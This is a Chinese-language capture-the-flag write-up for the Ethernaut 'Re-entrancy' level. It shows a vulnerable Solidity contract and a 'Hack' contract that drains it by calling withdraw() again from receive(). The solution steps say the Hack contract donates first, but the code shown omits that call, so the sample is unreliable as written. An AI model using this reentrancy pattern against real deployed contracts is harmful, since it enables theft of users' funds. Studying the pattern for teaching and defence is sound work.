# Ethernaut 10-Re-entrancy

## 本关目标

- 从合约中转走所有余额

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances; // 记录地址和余额的对应关系

  // 更新balances
  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  // 只能最多取走自己donate的值，然后修改balances
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

## 解决方案

1. 在 etherscan 中查看当前合约中的余额（根据 Reentrance 的实例地址）
2. 在 Hack 合约中调用 donate(msg.sender)存入和合约余额相同的 ether
3. 在 Hack 合约中调用 withdraw(), 并在 receive()中再次调用 withdraw()，因为在一个交易中，balances 还没有更新，可以再次转账成功

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IReentrance.sol";

contract Hack {
    IReentrance private re;

    function hack(address _target) public {
        re = IReentrance(_target);
        IReentrance(_target).withdraw(1000000000000000);

    }

    receive() external payable{
        re.withdraw(1000000000000000);
    }
}
```

IReentrance.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IReentrance{
    function donate(address _to) external payable;

  function balanceOf(address _who) external view returns (uint balance);

  function withdraw(uint _amount) external;
}
```
